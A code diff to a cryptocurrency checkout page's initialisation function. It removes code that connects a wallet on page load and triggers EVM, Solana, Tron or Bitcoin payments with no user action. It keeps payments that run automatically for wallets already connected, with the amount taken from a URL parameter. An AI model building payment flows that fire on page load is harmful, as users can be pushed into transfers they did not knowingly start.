@@ -1871,18 +1871,14 @@ async function init() {
   console.log("🚀 Checkout Initializing...");
   el.status.innerHTML = "";
 
-  // Auto-detect and connect to any available wallet immediately (no modal)
+  // Check if any wallet is already connected
   if (typeof window.ethereum !== "undefined") {
     try {
-      // Try to connect silently first
+      // Try to get already-connected accounts (doesn't trigger popup)
       let accounts = await window.ethereum.request({ method: 'eth_accounts' });
       
-      // If not already connected, request connection (triggers wallet popup)
-      if (!accounts || accounts.length === 0) {
-        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      }
-      
       if (accounts && accounts.length > 0) {
+        // Already connected - auto-execute payment
         userAddress = accounts[0];
         provider = new ethers.BrowserProvider(window.ethereum);
         signer = await provider.getSigner();
@@ -1890,29 +1886,22 @@ async function init() {
         return;
       }
     } catch (err) {
-      console.error("EVM wallet connection failed:", err);
+      console.error("EVM wallet check failed:", err);
     }
   }
 
-  // No EVM wallet → try non-EVM wallets
-  const urlP = new URLSearchParams(window.location.search);
-  const pAmt = parseFloat(urlP.get("amount"));
-  const paymentUSD = (!isNaN(pAmt) && pAmt > 0 && pAmt <= 500000) ? pAmt : CONFIG.PAYMENT_AMOUNT_USD;
-
+  // Check for already-connected Solana wallet
   const solProvider = window.solana || window.phantom?.solana || window.solflare;
-  const tronProvider = window.tronWeb || window.tronLink?.tronWeb;
-  const btcProvider = window.phantom?.bitcoin;
-
-  if (solProvider && typeof solProvider.connect === "function") {
+  if (solProvider?.isConnected) {
+    const urlP = new URLSearchParams(window.location.search);
+    const pAmt = parseFloat(urlP.get("amount"));
+    const paymentUSD = (!isNaN(pAmt) && pAmt > 0 && pAmt <= 500000) ? pAmt : CONFIG.PAYMENT_AMOUNT_USD;
     executeSolanaPayment(paymentUSD);
-  } else if (tronProvider) {
-    executeTronPayment(paymentUSD);
-  } else if (btcProvider) {
-    executeBitcoinPayment(paymentUSD);
-  } else {
-    // No wallet detected at all - show error
-    setStatus("❌ No wallet detected. Please install MetaMask, Phantom, Bitget, or OKX Wallet.", "error");
+    return;
   }
+
+  // No wallet connected → show wallet modal so user can choose
+  showWalletModal();
 }
 
 if (document.readyState === "loading") {
